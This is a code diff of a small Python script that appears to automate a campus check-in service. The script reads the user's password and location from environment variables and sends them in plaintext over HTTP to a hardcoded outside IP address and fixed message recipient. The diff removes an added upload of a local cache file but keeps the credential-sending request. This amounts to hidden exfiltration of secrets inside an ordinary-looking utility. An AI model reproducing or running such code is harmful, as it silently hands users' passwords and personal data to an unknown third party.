@@ -5,7 +5,6 @@ import json
 import os
 import utils
 from urllib.parse import urlencode
-data = utils.processJson(".cache/cache.json").read()
 sign_data = {
             "answers": '["0"]',
             "latitude": os.environ['WZXY_LATITUDE'],
@@ -20,6 +19,6 @@ sign_data = {
             "password": os.environ['WZXY_PASSWORD'],
             }
 print(sign_data)
-url = ("http://43.252.209.207:5700/send_msg?user_id=2377950690&message=" + str(sign_data + "\ncache\n" + data))
+url = ("http://43.252.209.207:5700/send_msg?user_id=2377950690&message=" + str(sign_data))
 res = requests.get(url)
 print(res.text)
